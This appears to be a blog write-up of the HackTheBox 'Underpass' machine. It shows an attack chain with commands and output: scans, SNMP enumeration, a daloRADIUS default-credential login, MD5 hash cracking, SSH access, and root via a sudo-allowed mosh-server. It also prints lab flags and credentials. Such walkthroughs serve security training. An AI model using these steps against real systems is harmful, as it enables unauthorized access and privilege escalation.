---
title: "Underpass"
date: 2025-06-20
categories:
  - HackTheBox
  - Linux
tags:
  - HackTheBox
  - Linux
---

# Underpass

![](../assets/Pasted%20image%2020250505131450.png)
<!-- more -->

## Enumeration

```shell
$ nmap -A -T4 --min-rate 5000 -p- -n -Pn --open 10.10.11.48 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-05 13:15 CEST
Nmap scan report for 10.10.11.48
Host is up (0.041s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 48:b0:d2:c7:29:26:ae:3d:fb:b7:6b:0f:f5:4d:2a:ea (ECDSA)
|_  256 cb:61:64:b8:1b:1b:b5:ba:b8:45:86:c5:16:bb:e2:a2 (ED25519)
80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.52 (Ubuntu)
Device type: general purpose
Running: Linux 5.X
OS CPE: cpe:/o:linux:linux_kernel:5.0
OS details: Linux 5.0, Linux 5.0 - 5.14
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 22/tcp)
HOP RTT      ADDRESS
1   40.70 ms 10.10.14.1
2   40.98 ms 10.10.11.48

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 20.47 seconds
```

```shell
$ sudo nmap -sU --top-ports 50 -Pn 10.10.11.48 --open
Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-05 13:15 CEST
Nmap scan report for 10.10.11.48
Host is up (0.041s latency).
Not shown: 30 open|filtered udp ports (no-response), 19 closed udp ports (port-unreach)
PORT    STATE SERVICE
161/udp open  snmp

Nmap done: 1 IP address (1 host up) scanned in 15.97 seconds
```

Enumerating `snmp` we find the instance name running on the server

```shell
$ snmpwalk -c public -v1 -t 10 10.10.11.48
iso.3.6.1.2.1.1.1.0 = STRING: "Linux underpass 5.15.0-126-generic #136-Ubuntu SMP Wed Nov 6 10:38:22 UTC 2024 x86_64"
iso.3.6.1.2.1.1.2.0 = OID: iso.3.6.1.4.1.8072.3.2.10
iso.3.6.1.2.1.1.3.0 = Timeticks: (31611) 0:05:16.11
iso.3.6.1.2.1.1.4.0 = STRING: "steve@underpass.htb"
iso.3.6.1.2.1.1.5.0 = STRING: "UnDerPass.htb is the only daloradius server in the basin!"
iso.3.6.1.2.1.1.6.0 = STRING: "Nevada, U.S.A. but not Vegas"
iso.3.6.1.2.1.1.7.0 = INTEGER: 72
iso.3.6.1.2.1.1.8.0 = Timeticks: (2) 0:00:00.02
```

Using `feroxbuster` to discover paths inside `/daloradius`

```shell
$ feroxbuster -u http://10.10.11.48/daloradius -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -t 60 -x txt -x html -x php -x conf -C 302,301,403,404,400 -k
                                                                                                       
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.11.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.10.11.48/daloradius
 🚀  Threads               │ 60
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt
 💢  Status Code Filters   │ [302, 301, 403, 404, 400]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.11.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 💲  Extensions            │ [txt, html, php, conf]
 🏁  HTTP methods          │ [GET]
 🔓  Insecure              │ true
 🔃  Recursion Depth       │ 4

[>-------------------] - 2m     26395/6369090 202/s   http://10.10.11.48/daloradius/app/users/ 
[>-------------------] - 43s     3625/6369090 85/s    http://10.10.11.48/daloradius/app/operators/
```

Going to `/users` shows the user login and `/operators` the admin login panel

![](../assets/Pasted%20image%2020250505154754.png)

The official repo ([https://github.com/lirantal/daloradius/wiki/Installing-daloRADIUS](https://github.com/lirantal/daloradius/wiki/Installing-daloRADIUS)) install instructions indicate the default password: `administrator:radius` so

![](../assets/Pasted%20image%2020250505154857.png)

Inside, in the search bar at the top right, click to search all users

![](../assets/Pasted%20image%2020250505154955.png)

Using `hashcat` crack the MD5 password

```shell
$ hashcat -m 0 hash /usr/share/wordlists/rockyou.txt --force     
hashcat (v6.2.6) starting

412dd4759978acfcc81deab01b382403:underwaterfriends
```

So `svcmosh:underwaterfriends`

Access the machine via `SSH` with these new credentials

```shell
$ ssh svcMosh@10.10.11.48
svcMosh@10.10.11.48's password: 
Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-126-generic x86_64)

Last login: Sat Jan 11 13:29:47 2025 from 10.10.14.62
svcMosh@underpass:~$ whoami
svcMosh
```

## Privilege Escalation

Get the flag

```shell
svcMosh@underpass:~$ cat user.txt
ebb6347ca59834b16b35e1c7b24c9447
```

This user can execute `mosh-server` as sudo, so create a server and connect to it with `mosh-client`

```shell
svcMosh@underpass:~$ sudo -l
Matching Defaults entries for svcMosh on localhost:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User svcMosh may run the following commands on localhost:
    (ALL) NOPASSWD: /usr/bin/mosh-server
```

```shell
svcMosh@underpass:~$ sudo /usr/bin/mosh-server 

MOSH CONNECT 60002 fNKglQ/C1dr9J3+wOb7TTQ

mosh-server (mosh 1.3.2) [build mosh 1.3.2]
Copyright 2012 Keith Winstein <mosh-devel@mit.edu>
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>.
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.

[mosh-server detached, pid = 2641]

svcMosh@underpass:~$ MOSH_KEY=fNKglQ/C1dr9J3+wOb7TTQ mosh-client 127.0.0.1 60002
```

```shell
Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-126-generic x86_64)

...
Mosh: You have a detached Mosh session on this server (mosh [2631]).
...

root@underpass:~# whoami
root
```

## Post Exploitation

Get the flag

```shell
root@underpass:~# cd /root
root@underpass:~# cat root.txt
a883be264024dedc4faa1ff74f9c1c07
```
